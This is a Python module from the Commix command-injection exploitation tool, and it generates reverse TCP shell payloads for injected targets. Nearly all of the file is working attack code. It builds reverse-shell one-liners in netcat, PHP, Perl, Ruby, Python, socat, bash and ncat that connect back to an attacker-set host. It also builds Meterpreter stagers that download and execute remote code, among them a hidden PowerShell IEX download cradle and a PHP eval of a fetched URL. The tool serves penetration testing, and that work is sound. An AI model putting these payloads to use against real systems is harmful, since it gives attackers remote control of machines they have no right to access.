#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import os
import random
import string
import subprocess
from src.utils import common
from src.core.parse import cmdline as menu
from src.utils import settings
from src.core.compat import xrange
from src.core.controller import checks
from src.core.shells import modes
from src.thirdparty.colorama import Fore, Back, Style, init

"""
Use %XX only where the target performs one URL-decode pass; use literals for header-based injection points.
"""
def _needs_literal_encoding():
  return (
    settings.COOKIE_INJECTION
    or settings.USER_AGENT_INJECTION
    or settings.REFERER_INJECTION
    or settings.HOST_INJECTION
    or settings.CUSTOM_HEADER_INJECTION
  )

# The literal spelling where the carrier can hold it, and the encoded one where it cannot.
def _lit(encoded, literal):
  return literal if _needs_literal_encoding() else encoded

"""
Netcat reverse TCP shell - one generator, parameterized by which netcat binary to target.
"""
def _netcat_reverse_shell(nc_alternative, use_dash_e=True):
  shell = "sh"
  nc_alternative, shell = checks.use_bin_subdir(nc_alternative, shell)

  # Netcat with -e - options go before the host/port, netcat-traditional ignores them after it.
  if use_dash_e:
    return (
      nc_alternative
      + " -e "
      + shell
      + settings.SINGLE_WHITESPACE
      + settings.LHOST
      + settings.SINGLE_WHITESPACE
      + settings.LPORT
    )

  tmp_fifo = checks.random_tmp_path()

  return (
    shell
    + " -c \"rm -f " + tmp_fifo + ";mkfifo " + tmp_fifo + ";"
    + shell
    + " 0<" + tmp_fifo + " | "
    + nc_alternative
    + settings.SINGLE_WHITESPACE
    + settings.LHOST
    + settings.SINGLE_WHITESPACE
    + settings.LPORT
    # Taken away again when the pipeline ends, not only before it starts - cleared on the way in
    # alone, the pipe is left on the target for good once the session closes.
    + " 1>" + tmp_fifo + ";rm -f " + tmp_fifo + "\""
  )

"""
PHP reverse TCP shell.
"""
def gen_php_reverse():
  return (
    "php -r '$s=fsockopen(\""
    + settings.LHOST
    + "\","
    + settings.LPORT
    + ");"
    "while(($c=fgets($s))!==false){$c=rtrim($c);if(strpos($c,\"cd \")===0){chdir(substr($c,3));continue;}fwrite($s,shell_exec($c));}'"
  )

"""
Perl reverse TCP shell.
"""
def gen_perl_reverse():
  # Relays in Perl itself - exec()ing "sh -i" on a raw socket gives no working shell.
  return (
    "perl -e 'use Socket;"
    "$i=\""
    + settings.LHOST
    + "\";"
    "$p="
    + settings.LPORT
    + ";"
    "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
    "connect(S,sockaddr_in($p,inet_aton($i)));"
    "select(S);$|=1;"
    # chdir() persists for the process, and qx() inherits it - so "cd" carries to the next command.
    "while(<S>){chomp;if(/^cd\\s+(.+)/){chdir($1);next;}print S qx($_);}'"
  )

"""
Ruby reverse TCP shell.
"""
def gen_ruby_reverse():
  return (
    "ruby -rsocket -e '"
    "c=TCPSocket.new(\""
    + settings.LHOST
    + "\","
    + settings.LPORT
    + ");"
    "$stdin.reopen(c);"
    "$stdout.reopen(c);"
    "$stderr.reopen(c);"
    "$stdin.each_line{|l|l=l.strip;"
    "next if l.length==0;"
    "(IO.popen(l,\"rb\"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil }'"
  )

"""
Python reverse TCP shell.
"""
def gen_python_reverse():
  if not settings.USER_DEFINED_PYTHON_INTERPRETER:
    checks.set_python_interpreter()

  return (
    settings.LINUX_PYTHON_INTERPRETER
    + " -c 'import socket,os,pty%0d"
    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0d"
    "s.connect((\""
    + settings.LHOST
    + "\","
    + settings.LPORT
    + "))%0d"
    "os.dup2(s.fileno(),0)%0d"
    "os.dup2(s.fileno(),1)%0d"
    "os.dup2(s.fileno(),2)%0d"
    "pty.spawn(\"/bin/sh\")%0d'"
  )

"""
Socat reverse TCP shell.
"""
def gen_socat_reverse():
  return (
    "socat tcp-connect:"
    + settings.LHOST
    + ":"
    + settings.LPORT
    + " exec:\"sh\",pty,stderr,setsid,sigint,sane"
  )

"""
Bash reverse TCP shell - writes the payload to a temp file, then executes it,
chained with the target's own confirmed separator (needs a real one - see the
plumbing in shell_options.py/handler.py that supplies it instead of "").
"""
def gen_bash_reverse(separator):
  tmp_file = ''.join(
    [
      random.choice(string.ascii_letters + string.digits)
      for n in xrange(5)
    ]
  )

  return (
    "echo \"/bin/sh 0>/dev/tcp/"
    + settings.LHOST
    + "/"
    + settings.LPORT
    + " 1>" + _lit("%26", "&") + "0 2>" + _lit("%26", "&") + "0\" > /tmp/"
    + tmp_file
    + settings.SINGLE_WHITESPACE
    + separator
    + " /bin/bash /tmp/"
    + tmp_file
    # Removed once the shell it started has ended, rather than left in the target's temp directory.
    + separator
    + " rm -f /tmp/"
    + tmp_file
  )

"""
Ncat reverse TCP shell.
"""
def gen_ncat_reverse():
  return (
    "ncat -e /bin/sh "
    + settings.LHOST
    + settings.SINGLE_WHITESPACE
    + settings.LPORT
  )

"""
PHP meterpreter reverse TCP shell (via msfvenom).
"""
def gen_php_meterpreter_reverse():
  if checks.metasploit_missing():
    return None

  payload = "php/meterpreter/reverse_tcp"
  output = "php_meterpreter.rc"
  info_msg = "Generating the '" + payload + "' payload. "
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))

  try:
    data = checks.generate_msf_payload(payload, output, "LHOST", settings.LHOST, " -e php/base64", strip_newlines=True)
    if settings.TARGET_OS == settings.OS.WINDOWS and not settings.USER_DEFINED_PHP_DIR:
      checks.set_php_working_dir()
      other_shell = settings.WIN_PHP_DIR + " -r " + data
    else:
      other_shell = "php -r \"" + data + "\""
    checks.msf_launch_msg(output)
    return other_shell
  except:
    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    return None

"""
Python meterpreter reverse TCP shell (via msfvenom).
"""
def gen_python_meterpreter_reverse():
  if checks.metasploit_missing():
    return None

  payload = "python/meterpreter/reverse_tcp"
  output = "py_meterpreter.rc"
  info_msg = "Generating the '" + payload + "' payload. "
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))

  try:
    data = checks.generate_msf_payload(payload, output, "LHOST", settings.LHOST, "", strip_newlines=False)
    if settings.TARGET_OS == settings.OS.WINDOWS:
      if not settings.USER_DEFINED_PYTHON_DIR:
        checks.set_python_working_dir()
      other_shell = settings.WIN_PYTHON_INTERPRETER + " -c " + "\"" + data + "\""
    else:
      if not settings.USER_DEFINED_PYTHON_INTERPRETER:
        checks.set_python_interpreter()
      other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c " + "\"" + data + "\""
    checks.msf_launch_msg(output)
    return other_shell
  except:
    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    return None

"""
Write the shared web_delivery.rc resource file for the given payload/target index.
"""
def _write_web_delivery_rc(payload, target_index):
  output = "web_delivery.rc"
  with open(output, 'w+') as filewrite:
    filewrite.write("use exploit/multi/script/web_delivery" + settings.END_LINE.LF +
                    "set target " + str(target_index) + settings.END_LINE.LF +
                    "set payload " + payload + settings.END_LINE.LF +
                    "set lhost " + str(settings.LHOST) + settings.END_LINE.LF +
                    "set lport " + str(settings.LPORT) + settings.END_LINE.LF +
                    "set srvport " + str(settings.SRVPORT) + settings.END_LINE.LF +
                    "set uripath " + settings.URIPATH + settings.END_LINE.LF +
                    "exploit" + settings.END_LINE.LF * 2)
  return output

"""
Web delivery - Python meterpreter reverse TCP shell.
"""
def gen_web_delivery_python():
  if checks.metasploit_missing():
    return None

  output = _write_web_delivery_rc("python/meterpreter/reverse_tcp", 0)
  data = "import sys%3bimport ssl%3bu%3d__import__('urllib'%2b{2%3a'',3%3a'.request'}[sys.version_info[0]],fromlist%3d('urlopen',))%3br%3du.urlopen('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "',context%3dssl._create_unverified_context())%3bexec(r.read())%3b"
  if _needs_literal_encoding():
    data = data.replace("%3b", ";").replace("%3d", "=").replace("%2b", "+").replace("%3a", ":")
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if not settings.USER_DEFINED_PYTHON_DIR:
      checks.set_python_working_dir()
    other_shell = settings.WIN_PYTHON_INTERPRETER + " -c " + "\"" + data + "\""
  else:
    if not settings.USER_DEFINED_PYTHON_INTERPRETER:
      checks.set_python_interpreter()
    other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c " + "\"" + data + "\""
  checks.msf_launch_msg(output)
  return other_shell

"""
Web delivery - PHP meterpreter reverse TCP shell.
"""
def gen_web_delivery_php():
  if checks.metasploit_missing():
    return None

  output = _write_web_delivery_rc("php/meterpreter/reverse_tcp", 1)
  if settings.TARGET_OS == settings.OS.WINDOWS and not settings.USER_DEFINED_PHP_DIR:
    checks.set_php_working_dir()
    other_shell = settings.WIN_PHP_DIR + " -d allow_url_fopen=true -r eval(file_get_contents('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'));"
  else:
    other_shell = "php -d allow_url_fopen=true -r \"eval(file_get_contents('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'));\""
  checks.msf_launch_msg(output)
  return other_shell

"""
Web delivery - Windows meterpreter reverse TCP shell.
"""
def gen_web_delivery_windows():
  if checks.metasploit_missing():
    return None

  output = _write_web_delivery_rc("windows/meterpreter/reverse_tcp", 2)
  if not settings.TARGET_OS == settings.OS.WINDOWS:
    checks.windows_only_attack_vector()
    return None

  other_shell = "powershell -nop -w hidden -c $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy(); $x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; IEX $x.downloadstring('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "');"
  checks.msf_launch_msg(output)
  return other_shell

# Module path (relative to "reverse_tcp/") -> (description, generator(separator)).
REVERSE_TCP_MODULES = {
  "netcat/traditional":            ("Netcat-Traditional",      lambda separator: _netcat_reverse_shell("nc.traditional")),
  "netcat/busybox":                ("Netcat-Busybox",                    lambda separator: _netcat_reverse_shell("busybox nc")),
  "netcat/openbsd":                ("Netcat-Openbsd (no '-e' support)",       lambda separator: _netcat_reverse_shell("nc", use_dash_e=False)),
  "php":                           ("PHP reverse TCP shell",                              lambda separator: gen_php_reverse()),
  "perl":                          ("Perl reverse TCP shell",                             lambda separator: gen_perl_reverse()),
  "ruby":                          ("Ruby reverse TCP shell",                             lambda separator: gen_ruby_reverse()),
  "python":                        ("Python reverse TCP shell",                           lambda separator: gen_python_reverse()),
  "socat":                         ("Socat reverse TCP shell",                            lambda separator: gen_socat_reverse()),
  "bash":                          ("Bash reverse TCP shell",                             gen_bash_reverse),
  "ncat":                          ("Ncat reverse TCP shell",                              lambda separator: gen_ncat_reverse()),
  "meterpreter/php":               ("PHP Meterpreter reverse TCP shell",                  lambda separator: gen_php_meterpreter_reverse()),
  "meterpreter/python":            ("Python Meterpreter reverse TCP shell",               lambda separator: gen_python_meterpreter_reverse()),
  "web_delivery/python":           ("Python Meterpreter reverse TCP shell (web delivery)",   lambda separator: gen_web_delivery_python()),
  "web_delivery/php":              ("PHP Meterpreter reverse TCP shell (web delivery)",      lambda separator: gen_web_delivery_php()),
  "web_delivery/windows":          ("Windows Meterpreter reverse TCP shell (web delivery)", lambda separator: gen_web_delivery_windows()),
}

"""
Set up and choose the reverse TCP connection - the prompt itself is the shared mode loop.
"""
REVERSE_TCP_MODE = modes.ShellMode(
  name="reverse_tcp",
  modules=REVERSE_TCP_MODULES,
  help_menu=menu.reverse_tcp_options,
  option_rows=lambda: [
    ("LHOST", settings.LHOST, True, "The local host to listen on / connect back to"),
    ("LPORT", settings.LPORT, True, "The listening port"),
    ("SRVPORT", str(settings.SRVPORT), False, "The local port for the web delivery server"),
    ("URIPATH", settings.URIPATH, False, "The URI to use for the web delivery server"),
    ("HANDLER", "on" if settings.HANDLER else "off", False, "Catch the shell locally (instead of an external listener) (nc/ncat)"),
  ],
  required=("LHOST", "LPORT"),
  required_hint="Required options not set. Use 'set lhost <ip>' and 'set lport <port>'.",
  set_options=(
    ("lhost", checks.check_lhost),
    ("lport", checks.check_lport),
    ("srvport", checks.check_srvport),
    ("uripath", checks.check_uripath),
    ("handler", checks.check_handler),
  ),
  unsupported=("rhost", "lhost"),
  build=lambda module_path, separator: REVERSE_TCP_MODULES[module_path][1](separator),
  usage_hint="Use 'set lhost <ip>' and 'set lport <port>' to configure the reverse TCP connection.",
)

# The options this mode offers, printed when the user asks for them.
def reverse_tcp_options(separator, filename, url):
  return modes.shell_mode_options(REVERSE_TCP_MODE, separator, filename, url)

# eof
